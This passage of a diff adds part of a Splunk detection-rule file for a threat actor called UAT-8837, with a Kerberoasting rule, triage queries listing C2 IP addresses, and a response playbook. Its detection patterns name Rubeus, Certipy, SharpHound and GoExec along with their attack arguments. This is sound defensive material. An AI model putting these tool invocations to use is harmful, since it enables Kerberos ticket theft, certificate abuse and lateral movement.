+    (AD enumeration/collectionmethod), and GoExec (wmi/dcom remote execution with
+    -H/--nt-hash). These persist even when the binaries are renamed to .ico.
+  mitre:
+    tactic: "Credential Access"
+    technique: "T1558.003"
+    technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
+  severity: HIGH
+  confidence: HIGH
+  risk_score: 90
+  search: >
+    (index=main OR index=endpoint OR index=windows)
+    (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" OR sourcetype="XmlWinEventLog:Security"
+     OR sourcetype="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational")
+    (EventCode=1 OR EventCode=4688 OR EventCode=4104)
+    | eval cmd=lower(coalesce(CommandLine, Process_Command_Line, ScriptBlockText, ""))
+    | eval tool=case(
+        match(cmd,"(asktgt|kerberoast|asreproast|\bptt\b|tgtdeleg|/rc4|s4u)") AND NOT match(cmd,"klist"), "RUBEUS_KERBEROS",
+        match(cmd,"certipy") OR match(cmd,"(find|req|auth|shadow) +-(ca|template|target|username)"), "CERTIPY_ADCS",
+        match(cmd,"sharphound|invoke-bloodhound|collectionmethod"), "SHARPHOUND_AD",
+        match(cmd,"(wmi|dcom) +(proc|mmc).*(-h |--nt-hash)") OR match(cmd,"goe\.ico"), "GOEXEC_LATMOVE",
+        match(cmd,"invoke-wmiexec"), "INVOKE_WMIEXEC",
+        true(), null())
+    | where isnotnull(tool)
+    | stats count min(_time) as first_seen max(_time) as last_seen
+      values(tool) as tools values(cmd) as command_lines values(User) as users
+      by Computer
+    | eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S"), last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
+    | table Computer tools command_lines users first_seen last_seen count
+  schedule:
+    cron: "*/5 * * * *"
+    window: "-6m@m"
+  throttle:
+    field: "Computer,tools"
+    period: "20m"
+  actions:
+    notable:
+      rule_title: "UAT-8837: Kerberos/AD CS/lateral-movement tooling on $Computer$ ($tools$)"
+      severity: high
+      recommended_actions:
+        - Identify targeted SPNs / certificate templates / remote hosts from the command line
+        - Rotate affected service-account passwords (Kerberoast) and review AD CS template security (Certipy)
+        - Trace GoExec/Invoke-WMIExec target hosts as lateral-movement next-hops
+    risk:
+      score: 90
+      object_type: "system"
+      object_field: "Computer"
+  false_positives:
+    - "Authorized AD security assessments using Rubeus/Certipy/SharpHound — allowlist the engagement window/host"
+
+
+# ==============================================================================
+#  INVESTIGATION QUERIES (run manually during triage)
+# ==============================================================================
+#
+#  IQ1 — Full activity on a flagged host in the last 24h:
+#    index=main Computer="<host>" (EventCode=1 OR EventCode=3 OR EventCode=11 OR EventCode=13) earliest=-24h
+#    | sort _time | table _time EventCode Image ParentImage CommandLine TargetFilename TargetObject DestinationIp
+#
+#  IQ2 — Every internal host that talked to UAT-8837 C2:
+#    index=network (dest_ip IN ("74.176.166.174","20.200.129.75","172.188.162.183","4.144.1.47","103.235.46.102"))
+#    | stats count values(dest_ip) as c2 min(_time) as first max(_time) as last by src_ip
+#
+#  IQ3 — Hunt every .ico executed as a program across the fleet:
+#    index=main (EventCode=1 OR EventCode=4688) (Image="*.ico" OR CommandLine="*\\temp\\*.ico*")
+#    | stats values(Image) values(CommandLine) count by Computer
+#
+#  IQ4 — Tool-hash sweep (file creation + execution):
+#    index=main (EventCode=1 OR EventCode=11)
+#    | eval sha=lower(replace(coalesce(SHA256,Hashes,""),".*SHA256=([0-9A-Fa-f]+).*","\1"))
+#    | lookup uat8837_file_hashes.csv sha256 AS sha OUTPUT tool
+#    | where isnotnull(tool) | table _time Computer tool Image TargetFilename
+#
+# ==============================================================================
+#  RESPONSE PLAYBOOK
+# ==============================================================================
+#
+#  1. CONTAIN   : Isolate hosts flagged by Rules 1/3/5; block the five C2 IPs at
+#                 firewall/proxy/DNS; disable backdoor accounts (Rule 8).
+#  2. SCOPE     : Use IQ1-IQ4 to enumerate affected hosts, C2 callers, dropped
+#                 tooling, and recon/credential-theft activity.
+#  3. ERADICATE : Remove Earthworm/.ico tools, DWAgent, backdoor accounts; restore
+#                 RestrictedAdmin (Rule 2); patch Sitecore CVE-2025-53690 and ROTATE
+#                 the ASP.NET machine keys (root cause of the ViewState bug).
+#  4. ROTATE    : Reset all credentials reachable from compromised hosts — domain
+#                 service accounts (Kerberoast), GPP-exposed creds, and any account
+#                 whose token/hash could have been stolen (GoTokenTheft / Rubeus).
+#  5. RECOVER   : Re-image compromised hosts; review AD CS templates (Certipy) and
+#                 privileged group membership; validate no trojanized DLLs shipped.
+#  6. HARDEN    : Patch + rotate Sitecore keys, enforce RestrictedAdmin/Remote
+#                 Credential Guard, restrict SeDebug/Token privileges, monitor
+#                 personal/service-account creation, and keep the C2/hash IOC
+#                 lookups fed from Talos updates.
+#
+# ==============================================================================
+#  END OF UAT-8837 DETECTION RULES
+# ==============================================================================
